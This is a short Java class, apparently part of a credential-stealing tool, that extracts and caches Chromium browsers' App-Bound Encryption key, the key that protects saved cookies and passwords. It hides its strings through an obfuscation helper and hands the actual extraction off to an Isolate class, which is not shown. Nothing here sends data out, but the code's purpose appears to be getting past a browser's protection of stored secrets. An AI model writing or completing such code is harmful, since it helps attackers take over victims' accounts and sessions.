package noface.browsers.abe;

import noface.browsers.Paths;
import noface.config.Log;
import noface.config.S;

import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public final class Resolve {

    private static final Map<String, byte[]> CACHE = new ConcurrentHashMap<>();
    private static volatile String last = "";

    public static String lastReason() {
        return last;
    }

    public static byte[] get(Paths.Def browser) {
        try {
            if (browser == null || !browser.chromium()) return null;
            if (!noface.browsers.Key.hasAbe(browser.localState())) {
                last = S.e("no_abe");
                return null;
            }
            String key = browser.localState().toAbsolutePath().normalize().toString();
            byte[] cached = CACHE.get(key);
            if (cached != null) {
                last = S.e("ok");
                return cached;
            }
            Log.out(S.e("[*] ") + browser.name() + S.e(" abe..."));
            Attempt att = Isolate.run(browser);
            if (att.ok()) {
                byte[] abe = att.key();
                if (abe != null && Valid.ok(abe)) {
                    CACHE.put(key, abe);
                    last = S.e("ok");
                    return abe;
                }
                last = S.e("bad_key");
            } else {
                last = att.reason() != null ? att.reason() : S.e("fail");
            }
            return null;
        } catch (Throwable t) {
            last = S.e("err");
            return null;
        }
    }

    private Resolve() {}
}
